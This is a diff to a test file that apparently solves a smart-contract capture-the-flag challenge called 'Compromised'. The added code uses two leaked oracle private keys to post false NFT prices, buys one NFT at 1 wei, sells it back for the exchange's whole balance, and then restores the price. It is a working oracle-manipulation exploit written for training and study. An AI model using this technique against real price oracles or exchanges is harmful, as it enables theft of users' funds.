@@ -60,7 +60,29 @@ describe('Compromised challenge', function () {
     });
 
     it('Exploit', async function () {        
-        /** CODE YOUR EXPLOIT HERE */
+        /** EXPLOIT -- SOLVED */
+        /** 
+         * leaked private keys of two trusted sources were given as base64 encoded data;
+         * converted the data into keys below, with an online base64 converter
+         * 
+         * manipulate the prices and buy + sell the NFT
+         * */
+        const source1 = new ethers.Wallet("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", ethers.provider);
+        const source2 = new ethers.Wallet("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48", ethers.provider);
+
+        await (await this.oracle.connect(source1).postPrice("DVNFT", 1)).wait();
+        await (await this.oracle.connect(source2).postPrice("DVNFT", 1)).wait();
+
+        await (await this.exchange.connect(attacker).buyOne({ value: 1})).wait();
+
+        await (await this.oracle.connect(source1).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE.add(1))).wait();
+        await (await this.oracle.connect(source2).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE.add(1))).wait();
+
+        await (await this.nftToken.connect(attacker).approve(this.exchange.address, 0)).wait();
+        await (await this.exchange.connect(attacker).sellOne(0)).wait();
+
+        await (await this.oracle.connect(source1).postPrice("DVNFT", INITIAL_NFT_PRICE)).wait();
+        await (await this.oracle.connect(source2).postPrice("DVNFT", INITIAL_NFT_PRICE)).wait();
     });
 
     after(async function () {
